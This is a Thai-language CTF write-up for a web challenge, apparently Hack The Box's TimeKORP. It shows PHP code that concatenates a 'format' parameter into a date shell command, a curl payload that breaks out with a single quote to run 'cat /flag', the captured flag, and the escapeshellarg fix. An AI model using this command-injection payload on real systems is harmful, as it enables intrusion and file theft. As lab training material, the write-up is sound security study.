# TimeKORP — CTF Writeup

## Challenge Info

- Name: TimeKORP
- Category: Web
- Flag: HTB{t1m3_f0r_th3_ult1m4t3_pwn4g3_fffe5b9f95609ace9093b67be7840496}

---

## Description

โจทย์ให้เราเจาะ web application ที่แสดงเวลาและวันที่แบบ real-time โดย flag อยู่ที่ /flag ใน container

---

## Reconnaissance

scan ด้วย feroxbuster ไม่พบหน้าที่น่าสนใจนอกจาก static files

สังเกต URL ของ website:
- หน้าแสดงเวลา: /?format=%H:%M:%S → It's 03:55:16
- หน้าแสดงวันที่: /?format=%Y-%m-%d → It's 2026-06-20

parameter `format` รับ strftime format specifier แล้ว server นำไปประมวลผล

---

## Analysis

ทดสอบ format specifier ต่างๆ พบว่า `%e` ให้ผลลัพธ์เป็นวันที่ (20) ซึ่งเป็น specifier ของ PHP/C strftime() ยืนยันว่า backend เป็น PHP

จาก source code พบว่า TimeModel.php สร้าง shell command โดยนำ user input ไปต่อตรงๆ โดยไม่ผ่าน escapeshellarg() หรือ escapeshellcmd() เลย:

```php
$this->command = "date '+" . $format . "' 2>&1";
```

และ TimeController.php รับ input โดยไม่มี sanitization ใดๆ:

```php
$format = isset($_GET['format']) ? $_GET['format'] : '%H:%M:%S';
```

---

## Exploitation

inject single quote เพื่อ break out จาก date command แล้วต่อ command ที่ต้องการ:

```bash
curl -g "http://154.57.164.66:31562/?format=%H:%M:%S';cat /flag;'"
```

Command ที่ server รันจริงคือ:

```
date '+%H:%M:%S';cat /flag;'' 2>&1
```

ได้ flag กลับมาทันที ส่วน "Permission denied" ที่ตามมาเป็น error จาก empty command หลัง semicolon ตัวสุดท้าย ไม่ใช่ error จริง

---

## Flag

HTB{t1m3_f0r_th3_ult1m4t3_pwn4g3_fffe5b9f95609ace9093b67be7840496}

---

## Root Cause

PHP exec() รับ user input โดยตรงโดยไม่มี sanitization ทำให้ผู้โจมตีสามารถ break out จาก date command และ inject OS command ได้ แก้ไขได้โดยใช้ escapeshellarg() ครอบ input ก่อนนำไปใช้

---

## Attack Chain

feroxbuster → พบ ?format= parameter → ทดสอบ %e ยืนยัน PHP strftime → วิเคราะห์ source code พบ exec() ไม่มี sanitization → inject single quote break out → cat /flag → ได้ flag